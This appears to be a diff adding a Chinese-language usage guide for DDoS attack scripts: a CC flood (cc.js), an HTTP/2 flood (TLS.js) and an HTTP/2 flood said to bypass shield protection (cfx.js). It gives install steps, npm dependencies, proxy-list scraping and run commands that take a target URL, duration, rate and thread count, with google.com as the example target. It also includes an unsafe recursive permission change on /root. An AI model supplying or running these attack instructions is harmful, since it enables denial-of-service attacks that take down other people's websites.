@@ -1,0 +1,58 @@
+1.上传cc.zip 包到root 再安装apt-get install -y unzip
+
+2.解压zip
+命令：cd /root &&  unzip cc.zip
+
+3.装node环境 
+命令：sh install.sh
+
+4.检查node环境
+命令：node -v
+
+5.给777权限
+命令：chown -R  777  /root
+         chown -R  777 *
+6查看777权限
+命令：ls   要全绿
+
+7.执行cc脚本
+命令：./cc
+
+8：测试命令
+
+命令：node cc.js 网址 proxy.txt 120
+
+Tls.js   http/2占用式攻击
+
+命令：
+node TLS.js <目标> <时间> <速率> <线程> <代理List>
+
+示例：
+node TLS.js https://google.com 60 64 5 proxy.txt
+
+安装：npm install net http2 tls cluster url path crypto user-agents fs header-generator axios
+
+cfx.js   http/2绕过盾式攻击
+
+命令：
+node cfx.js <目标> <时间> <速率> <线程> <代理List>
+
+示例：
+node cfx.js https://google.com 60 64 5 proxy.txt
+
+
+安装：
+npm install url fs http2 http tls net request cluster fake-useragent randomstring
+
+代理池爬取
+
+Python3 sctape.py
+
+以上全部下载在root文件  给上777权限 才能运行哦
+
+
+
+
+
+如果报错一定网址不对.
+          
